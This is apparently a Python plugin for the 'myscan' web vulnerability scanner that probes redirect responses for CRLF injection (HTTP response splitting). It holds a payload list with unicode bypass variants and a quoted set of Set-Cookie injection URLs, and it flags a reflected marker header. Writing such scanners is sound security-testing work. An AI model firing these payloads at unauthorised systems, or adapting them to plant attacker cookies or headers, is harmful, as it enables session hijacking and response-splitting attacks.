#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : myscan_crlf.py
# refer:https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/plugins/PerFile/crlf.py

import copy
import re
from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.const import notAcceptedExt


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get(
            "data")  # self.url为需要测试的url，但不会包含url参数，如https://www.baidu.com/index.php#tip1 .不会携带url参数，如?keyword=1
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "crlf inject"
        self.vulmsg = "攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        if not str(self.dictdata["response"]["status"]).startswith("3"):
            return
            # thanks payloads :https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/plugins/PerFile/crlf.py
        # 漏洞如xss一般，讲究输出在header里，这里先fuzz一下，后面会该代码，先判断参数值是否输出在headers里，再进行payload的探测
        '''
        from:
        https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/crlf-injection.yaml
        
        - "{{BaseURL}}/%0D%0ASet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection"  # unicode bypass
      - "{{BaseURL}}/%0DSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection"
      - "{{BaseURL}}/%0ASet-Cookie%3Acrlfinjection/.."  # Apache
      - "{{BaseURL}}/~user/%0D%0ASet-Cookie:crlfinjection"  # CVE-2016-4975
      - "{{BaseURL}}/?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection&checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&content=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&data=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&document=%0D%0ASet-Cookie:crlfinjection=crlfinjection&domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection&done=%0D%0ASet-Cookie:crlfinjection=crlfinjection&download=%0D%0ASet-Cookie:crlfinjection=crlfinjection&feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection&file=%0D%0ASet-Cookie:crlfinjection=crlfinjection&host=%0D%0ASet-Cookie:crlfinjection=crlfinjection&html=%0D%0ASet-Cookie:crlfinjection=crlfinjection&http=%0D%0ASet-Cookie:crlfinjection=crlfinjection&https=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&include=%0D%0ASet-Cookie:crlfinjection=crlfinjection&media=%0D%0ASet-Cookie:crlfinjection=crlfinjection&navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection&next=%0D%0ASet-Cookie:crlfinjection=crlfinjection&open=%0D%0ASet-Cookie:crlfinjection=crlfinjection&out=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection&port=%0D%0ASet-Cookie:crlfinjection=crlfinjection&proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection&referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection&req=%0D%0ASet-Cookie:crlfinjection=crlfinjection&request=%0D%0ASet-Cookie:crlfinjection=crlfinjection&retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return=%0D%0ASet-Cookie:crlfinjection=crlfinjection&returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&show=%0D%0ASet-Cookie:crlfinjection=crlfinjection&site=%0D%0ASet-Cookie:crlfinjection=crlfinjection&source=%0D%0ASet-Cookie:crlfinjection=crlfinjection&src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&target=%0D%0ASet-Cookie:crlfinjection=crlfinjection&to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection&url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&val=%0D%0ASet-Cookie:crlfinjection=crlfinjection&validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection&view=%0D%0ASet-Cookie:crlfinjection=crlfinjection&window=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
        '''
        payloads = [
            "\r\nTestInject: myscan",
            "\r\n\tTestInject: myscan",
            "\r\n TestInject: myscan",
            "\r\tTestInject: myscan",
            "\nTestInject: myscan",
            "\rTestInject: myscan",
            "%0ATestInject: myscan/..",
            "%3F%0DTestInject: myscan",
            "%E5%98%8A%E5%98%8DTestInject: myscan",
            "%0d%0aTestInject: myscan",
            r"\r\nCTestInject: myscan",
            # twitter crlf
            "嘊嘍TestInject: myscan",
            # nodejs crlf
            "čĊTestInject: myscan",
        ]
        parser = dictdata_parser(self.dictdata)
        # params_url = parser.getrequestparams_urlorcookie("url")
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        for param in params:
            for payload in payloads:
                req = parser.getreqfromparam(param, "a", payload)
                r = request(**req)
                if r != None:
                    resp_headers = str(r.headers)
                    res = re.search("TestInject': 'myscan'", resp_headers)
                    if res:
                        parser_ = response_parser(r)
                        self.result.append({
                            "name": self.name,
                            "url": self.dictdata.get("url").get("url").split("?")[0],
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request": parser_.getrequestraw(),
                                "response": parser_.getresponseraw(),
                            }
                        })
